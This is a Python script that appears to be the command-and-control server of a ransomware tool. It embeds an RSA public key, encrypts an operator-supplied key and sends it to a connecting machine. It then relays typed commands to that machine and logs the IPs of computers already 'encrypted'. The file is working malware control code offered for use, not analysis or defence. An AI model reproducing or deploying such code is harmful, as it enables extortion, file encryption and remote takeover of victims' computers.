import socket
import threading
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP


def recv(c):
    while True:
        data = c.recv(2048)
        if(len(data) != 0):
            print(data.decode('ascii'))
            

def Server():
    
    pk = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6rLPW9CeMMx9c0n5C9t7
XMfXaIpQ88RW0hOAgDNXsT6G+40yX02ThQGjuGolXdxUzKl510MntdQXHxusynni
hhibrg3Dm1I4n6Ddzj42rOo6qmasagzbABkt++CZcZyADbANhuQly7qOzMpfIcIr
M7VayfFdgxgeoMR1JgFXA107tr9cmguhs6J2WHlAESspknneYMuxA7AJcGwIbDH0
NIqMRw1hZBTiAILCCPvLIH/d7wAiZFCWCsDh4PTotDj9WgdrLECGpnSvCtlB2HRG
CHRitKzrpxZM+LeOsAxfKucZZWwxR9tYX3ug8/CudRA5WAURP8lM4K09Q/hd2wCb
nwIDAQAB
-----END PUBLIC KEY-----"""

    pk = pk.encode('ascii')
    publickey = RSA.importKey(pk)
    c = PKCS1_OAEP.new(publickey)
    key_value = input("the key : ")
    encrypted_key = c.encrypt(key_value.encode('ascii'))
    
    
    port = 4545
    ip = "192.168.1.10"
    
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.setblocking(1)
        s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        s.bind((ip,port))
        s.listen(1)
        c, add = s.accept()
        with open('ips.txt','a+') as ipLogger:
            ips = []
            with open('ips.txt','r') as ipReader:
                ips = ipReader.readlines()
            if(add[0]+'\n' in ips):
                print("you encrypted this pc before !!!")
            print(f"connection from {add[0]} : {add[1]}")
            c.send(encrypted_key)


            t = threading.Thread(target=recv,args=(c,))
            t.start()
            while True:
                command = input("command >> ")
                if command=="exit":
                    s.close()
                    break
                if command == "en":
                    ipLogger.write(f'\n{add[0]}\n')
                c.send(command.encode('ascii'))
        
    except socket.error as e:
        s.close()

Server()
        